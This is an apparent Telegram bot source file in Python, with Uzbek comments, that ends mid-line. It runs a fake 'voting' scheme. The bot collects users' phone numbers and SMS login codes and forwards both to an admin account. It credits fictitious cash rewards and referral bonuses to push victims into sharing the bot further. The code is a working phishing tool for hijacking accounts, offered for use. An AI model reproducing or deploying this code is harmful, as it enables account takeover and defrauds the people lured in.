import os
import sqlite3
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

BOT_TOKEN = os.getenv("BOT_TOKEN")  # Fly.io env: BOT_TOKEN
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # O'z Telegram ID'ingni qo'y

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# --- DB ---
conn = sqlite3.connect("users.db")
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance INTEGER DEFAULT 0,
    referrer_id INTEGER
)
""")
conn.commit()

# --- MENU ---
def get_menu(balance: int):
    menu = types.ReplyKeyboardMarkup(resize_keyboard=True)
    menu.add("🗳 Ovoz berish", "💰 Balans")
    menu.add("👥 Do‘stlarni taklif qilish")
    if balance >= 300000:
        menu.add("💳 Pul yechish")
    return menu

# --- START ---
@dp.message_handler(commands=["start"])
async def start_command(message: types.Message):
    user_id = message.from_user.id
    args = message.get_args()

    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()

    # Referralni saqlash
    if args.isdigit():
        referrer_id = int(args)
        if referrer_id != user_id:
            cursor.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
            conn.commit()

    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    balance = cursor.fetchone()[0]

    await message.answer("👋 Salom! Quyidagi menyudan foydalaning 👇", reply_markup=get_menu(balance))

# --- Ovoz berish ---
@dp.message_handler(lambda m: m.text == "🗳 Ovoz berish")
async def vote_handler(message: types.Message):
    button_phone = types.KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True)
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(button_phone)
    await message.answer("📱 Ovoz berish uchun telefon raqamingizni yuboring:", reply_markup=keyboard)

# --- Telefon raqam ---
@dp.message_handler(content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message):
    phone = message.contact.phone_number
    user_id = message.from_user.id

    if ADMIN_ID:
        await bot.send_message(ADMIN_ID, f"📞 {message.from_user.full_name} ({user_id}) raqam yubordi:\n{phone}")

    await message.answer("📞 Raqam tekshirilmoqda, biroz kuting...")
    await asyncio.sleep(4)
    await message.answer("✅ Endi SMS kodni yuboring.")

# --- Kod yuborilganda ---
@dp.message_handler(lambda m: m.text.isdigit())
async def sms_code_handler(message: types.Message):
    user_id = message.from_user.id
    code = message.text

    # Admin ko‘rishi uchun
    if ADMIN_ID:
        await bot.send_message(ADMIN_ID, f"🔢 {message.from_user.full_name} ({user_id}) yuborgan kod: {code}")

    # Balans qo‘shish
    cursor.execute("UPDATE users SET balance = balance + 120000 WHERE user_id = ?", (user_id,))

    # Referral uchun 60k
    cursor.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
    ref = cursor.fetchone()[0]
    if ref:
        cursor.execute("UPDATE users SET balance = balance + 60000 WHERE user_id = ?", (ref,))
        await bot.send_message(ref, "🎉 Sizning do‘stingiz ovoz berdi! Sizga +60 000 UZS qo‘shildi ✅")

    conn.commit()

    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    balance = cursor.fetchone()[0]

    await message.answer(f"✅ Kod qabul
